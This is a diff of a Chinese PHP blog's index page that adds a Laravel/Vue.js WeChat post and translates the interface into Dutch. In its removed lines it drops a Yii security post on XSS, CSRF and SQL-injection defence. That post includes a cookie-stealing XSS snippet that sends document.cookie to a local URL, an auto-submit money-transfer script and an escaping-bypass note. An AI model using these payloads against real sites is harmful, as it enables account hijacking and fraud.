@@ -54,7 +54,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Zoeken"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://luisedware.github.io"></form>
@@ -64,6 +64,54 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-使用-Laravel-与-Vue-js-进行微信开发（三）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/01/16/使用-Laravel-与-Vue-js-进行微信开发（三）/" class="article-date">
+  <time datetime="2017-01-16T15:04:33.000Z" itemprop="datePublished">2017-01-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/PHP/">PHP</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/01/16/使用-Laravel-与-Vue-js-进行微信开发（三）/">使用 Laravel 与 Vue.js 进行微信开发（三）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>本文的目标是实现微信公众号菜单的创建与删除</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
+<li>MacOS</li>
+<li>Laravel 5.1</li>
+<li>Vue.js 2.1</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://luisedware.github.io/2017/01/16/使用-Laravel-与-Vue-js-进行微信开发（三）/" data-id="ciy3qn0xw001xun4blfwhn2qs" class="article-share-link">Delen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Laravel/">Laravel</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-使用-Laravel-与-Vue-js-进行微信开发（二）" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -91,7 +139,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="配置回调地址"><a href="#配置回调地址" class="headerlink" title="配置回调地址"></a>配置回调地址</h2><p>微信公众平台 -&gt; 开发者工具 -&gt; 公众平台测试帐号 -&gt; 测试号管理 -&gt; 体验接口权限表 -&gt; 功能服务 -&gt; 网页帐号 -&gt; 修改 -&gt; 填写回调域名，格式如：www.baidu.com</p>
+        <h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>本文的目标是实现微信用户授权，当用户进入 Web App 的时候，能够获取用户的信息。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
+<li>MacOS</li>
+<li>Laravel 5.1</li>
+<li>Vue.js 2.1</li>
+</ul>
+<h2 id="配置回调地址"><a href="#配置回调地址" class="headerlink" title="配置回调地址"></a>配置回调地址</h2><p>微信公众平台 -&gt; 开发者工具 -&gt; 公众平台测试帐号 -&gt; 测试号管理 -&gt; 体验接口权限表 -&gt; 功能服务 -&gt; 网页帐号 -&gt; 修改 -&gt; 填写回调域名，格式如：www.baidu.com</p>
 <h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><p>可以修改文件 config/wechat.php ，也可以在 .env 文件进行配置</p>
 <p>wechat.php 文件配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line"> * OAuth 配置</div><div class="line"> *</div><div class="line"> * only_wechat_browser: 只在微信浏览器跳转</div><div class="line"> * scopes：公众平台（snsapi_userinfo / snsapi_base），开放平台：snsapi_login</div><div class="line"> * callback：OAuth授权完成后的回调页地址(如果使用中间件，则随便填写。。。)</div><div class="line"> */</div><div class="line"> &apos;oauth&apos; =&gt; [</div><div class="line">     &apos;only_wechat_browser&apos; =&gt; false,</div><div class="line">     &apos;scopes&apos;   =&gt; array_map(&apos;trim&apos;, explode(&apos;,&apos;, env(&apos;WECHAT_OAUTH_SCOPES&apos;, &apos;snsapi_userinfo&apos;))),</div><div class="line">     &apos;callback&apos; =&gt; env(&apos;WECHAT_OAUTH_CALLBACK&apos;, &apos;/examples/oauth_callback.php&apos;),</div><div class="line"> ],</div></pre></td></tr></table></figure></p>
 <p>.env 文件配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">WECHAT_APPID=****</div><div class="line">WECHAT_SECRET=***</div><div class="line">WECHAT_TOKEN=****</div><div class="line">WECHAT_AES_KEY=</div><div class="line"></div><div class="line">WECHAT_OAUTH_SCOPES=snsapi_userinfo</div><div class="line">WECHAT_OAUTH_CALLBACK=/wechat/oauth-callback</div></pre></td></tr></table></figure></p>
@@ -104,7 +158,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2017/01/16/使用-Laravel-与-Vue-js-进行微信开发（二）/" data-id="ciy06z2t800238x4b8g2i8cbc" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2017/01/16/使用-Laravel-与-Vue-js-进行微信开发（二）/" data-id="ciy3qn0xx0020un4bftnf2mya" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Laravel/">Laravel</a></li></ul>
@@ -142,7 +196,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="安装-EasyWechat"><a href="#安装-EasyWechat" class="headerlink" title="安装 EasyWechat"></a>安装 EasyWechat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">composer require &quot;overtrue/laravel-wechat:~3.0&quot;</div></pre></td></tr></table></figure>
+        <h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>本文的目标是实现与微信服务器的通信。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
+<li>MacOS</li>
+<li>Laravel 5.1</li>
+<li>Vue.js 2.1</li>
+<li>EasyWeChat</li>
+</ul>
+<h2 id="安装-EasyWechat"><a href="#安装-EasyWechat" class="headerlink" title="安装 EasyWechat"></a>安装 EasyWechat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">composer require &quot;overtrue/laravel-wechat:~3.0&quot;</div></pre></td></tr></table></figure>
 <h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul>
 <li>注册 ServiceProvider:<ul>
 <li>Overtrue\LaravelWechat\ServiceProvider::class,</li>
@@ -187,7 +248,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2017/01/15/使用-Laravel-与-Vue.js-进行微信开发（一）/" data-id="ciy06z2t600208x4bfnca1hyj" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2017/01/15/使用-Laravel-与-Vue.js-进行微信开发（一）/" data-id="ciy3qn0xy0024un4ba9tcxqgz" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Laravel/">Laravel</a></li></ul>
@@ -296,7 +357,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/12/08/学习-UML（一）/" data-id="ciy06z2ui00458x4bam8qt2qf" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/12/08/学习-UML（一）/" data-id="ciy3qn0zf004eun4betvi9ml6" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/UML/">UML</a></li></ul>
@@ -351,7 +412,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/12/02/Yii2-Working-with-Databases/" data-id="ciy06z2t2001s8x4br2vtgty2" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/12/02/Yii2-Working-with-Databases/" data-id="ciy3qn0xj001iun4b2h1onygx" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Yii/">Yii</a></li></ul>
@@ -421,7 +482,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/11/22/关于-PHP-函数-array-walk-的一些想法/" data-id="ciy06z2ue003y8x4b07nccxs4" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/11/22/关于-PHP-函数-array-walk-的一些想法/" data-id="ciy3qn0zc0047un4b8gqh9fhk" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li></ul>
@@ -487,7 +548,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/11/21/关于-PHP-函数-array-filter-的一些想法/" data-id="ciy06z2ud003v8x4b7g3wwyzp" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/11/21/关于-PHP-函数-array-filter-的一些想法/" data-id="ciy3qn0z3003qun4bdhntejyn" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li></ul>
@@ -548,7 +609,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/11/21/关于-PHP-函数-array-map-的一些想法/" data-id="ciy06z2ua003r8x4bndfwwyj5" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/11/21/关于-PHP-函数-array-map-的一些想法/" data-id="ciy3qn0z8003xun4b6l18kr1r" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li></ul>
@@ -597,7 +658,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/11/19/使用-PHPStorm-的-Live-Templates-封装常用代码/" data-id="ciy06z2tl002m8x4b7uz0or8b" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/11/19/使用-PHPStorm-的-Live-Templates-封装常用代码/" data-id="ciy3qn0yf002oun4bgziqm8dh" class="article-share-link">Delen</a>
       
       
     </footer>
@@ -637,77 +698,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/11/03/Yii-框架之工具篇/" data-id="ciy06z2sr001b8x4bod8kdlp3" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Yii/">Yii</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Yii-框架之安全篇" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/10/29/Yii-框架之安全篇/" class="article-date">
-  <time datetime="2016-10-29T13:05:35.000Z" itemprop="datePublished">2016-10-29</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/PHP/">PHP</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/10/29/Yii-框架之安全篇/">Yii 框架之安全篇</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="XSS-攻击和防范之存储"><a href="#XSS-攻击和防范之存储" class="headerlink" title="XSS 攻击和防范之存储"></a>XSS 攻击和防范之存储</h2><p>XSS 全称</p>
-<p>XSS 概念</p>
-<p>XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许恶意 Web 用户将代码植入到<br>提供给其它用户使用的页面中，从而对用户进行攻击</p>
-<h3 id="如何使用-XSS-攻击盗取用户账号"><a href="#如何使用-XSS-攻击盗取用户账号" class="headerlink" title="如何使用 XSS 攻击盗取用户账号"></a>如何使用 XSS 攻击盗取用户账号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var cookie = document.cookie;</div><div class="line">window.location.href = &quot;http://127.0.0.1/index.php?cookie=&quot;+cookie;</div></pre></td></tr></table></figure>
-<ul>
-<li>问题如下：document.cookie 获取得到的 cookie 是什么样的</li>
-<li>index.php 是如何处理 cookie 值的</li>
-<li>有了 cookie 怎么就能进行盗取账号的</li>
-</ul>
-<p>httponly 阻止 js 读取 cookie</p>
-<p>哪一段 js 代码能够自动转账<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">document.getElementById(&apos;ipt-search-key&apos;).value=&apos;withyz@xx.com&apos;;</div><div class="line">document.getElementById(&apos;amount&apos;).value=&apos;100&apos;;</div><div class="line">document.getElementById(&apos;reason&apos;).value=&apos;劫富济贫&apos;;</div><div class="line">document.getElementsByClassName(&apos;ui-button-text&apos;)[0].click();</div></pre></td></tr></table></figure></p>
-<p>如何把 js 注入到转账页面中</p>
-<h2 id="XSS-攻击和防范之反射"><a href="#XSS-攻击和防范之反射" class="headerlink" title="XSS 攻击和防范之反射"></a>XSS 攻击和防范之反射</h2><p>现代现浏览器(chrome)对于反射型XSS有一定防护<br>手动关闭：\Yii::$app-&gt;response-&gt;headers-&gt;add(‘X-XSS-Protection’, ‘0’);</p>
-<p>HTML 实体编码<br>URL 编码</p>
-<h2 id="XSS-攻击和防范之蠕虫"><a href="#XSS-攻击和防范之蠕虫" class="headerlink" title="XSS 攻击和防范之蠕虫"></a>XSS 攻击和防范之蠕虫</h2><h3 id="Yii-如何防范-XSS"><a href="#Yii-如何防范-XSS" class="headerlink" title="Yii 如何防范 XSS"></a>Yii 如何防范 XSS</h3><p>转码防范<br>\yii\helpers\Html::encode($script);</p>
-<p>过滤防范<br>\yii\helpers\HtmlPurifier::process($js);</p>
-<h2 id="CSRF-攻击和防范"><a href="#CSRF-攻击和防范" class="headerlink" title="CSRF 攻击和防范"></a>CSRF 攻击和防范</h2><p>跨站请求伪造</p>
-<p>get型的crtf攻击<br>构造url, 诱使用户点击</p>
-<p>透过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
-<p>yii 框架 csrf token 验证过程</p>
-<p>检查Referer字段<br>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于www.examplebank.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于www.examplebank.com之下，这时候服务器就能识别出恶意的访问。<br>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。<br>添加校验token<br>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>
-<h2 id="SQL-注入和防范"><a href="#SQL-注入和防范" class="headerlink" title="SQL 注入和防范"></a>SQL 注入和防范</h2><p>addslashes() 转义函数 防范 SQL 注入</p>
-<p>Sql注入：将要执行的sql语句采用拼接的方式组装时，就sql注入的可能；<br>原本要查询的字符串在拼接后发生发“越狱”，部分字符串被数据库识别成可执行语句，<br>导致意外的操作和查询结果<br>防范：1，屏蔽关键字和敏感词，有影响业务逻辑的可能；<br>2， 对传入变量转义，避免变量的内容越狱</p>
-<p>绕过转义：<br>char(0xdf)/‘,在utf-8下会变成β/‘,<br>而在gbk下由于汉字是2个字节组成；在数据中将变成 運’,单引号逃过了被转义</p>
-<p>使用PDO统一数据库接口，可以无痛切换；<br>使用占位符防范SQL注入</p>
-<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>文件上传漏洞<br>如果后台对文件上传审查不严，导致php代码上传后被执行，可进行遍历文件等操作使源码泄露</p>
-<p>用 fiddler 可以拦截请求,然后修改请求的内容,比如图片中的文件名,修改成如上形式后,会生成一个php文件,然后在上传后的目录执行php文件会造成危害</p>
-<p>保存上传过来的文件名的时候不要用用户本来的名称,容易在中途被非法修改,从而变成.php这些可执行文件,造成损害</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/10/29/Yii-框架之安全篇/" data-id="ciy06z2sp00188x4b05lbsxyy" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/11/03/Yii-框架之工具篇/" data-id="ciy3qn0xh001fun4bdh1qyuhv" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Yii/">Yii</a></li></ul>
@@ -722,7 +713,7 @@
 
 
   <nav id="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
   </nav>
 </section>
         
@@ -730,7 +721,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
+    <h3 class="widget-title">Categorieën</h3>
     <div class="widget">
       <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/MySQL/">MySQL</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Tooling/">Tooling</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/UML/">UML</a></li></ul>
     </div>
@@ -740,7 +731,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
+    <h3 class="widget-title">Labels</h3>
     <div class="widget">
       <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AliCloud/">AliCloud</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Laravel/">Laravel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHPStorm/">PHPStorm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sublime-Text-3/">Sublime Text 3</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UML/">UML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Yii/">Yii</a></li></ul>
     </div>
@@ -759,7 +750,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
+    <h3 class="widget-title">Archieven</h3>
     <div class="widget">
       <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li></ul>
     </div>
@@ -769,9 +760,13 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">Recente berichten</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2017/01/16/使用-Laravel-与-Vue-js-进行微信开发（三）/">使用 Laravel 与 Vue.js 进行微信开发（三）</a>
+          </li>
         
           <li>
             <a href="/2017/01/16/使用-Laravel-与-Vue-js-进行微信开发（二）/">使用 Laravel 与 Vue.js 进行微信开发（二）</a>
@@ -787,10 +782,6 @@
         
           <li>
             <a href="/2016/12/02/Yii2-Working-with-Databases/">Yii2 Working with Databases</a>
-          </li>
-        
-          <li>
-            <a href="/2016/11/22/关于-PHP-函数-array-walk-的一些想法/">关于 PHP 函数 array_walk 的一些想法</a>
           </li>
         
       </ul>
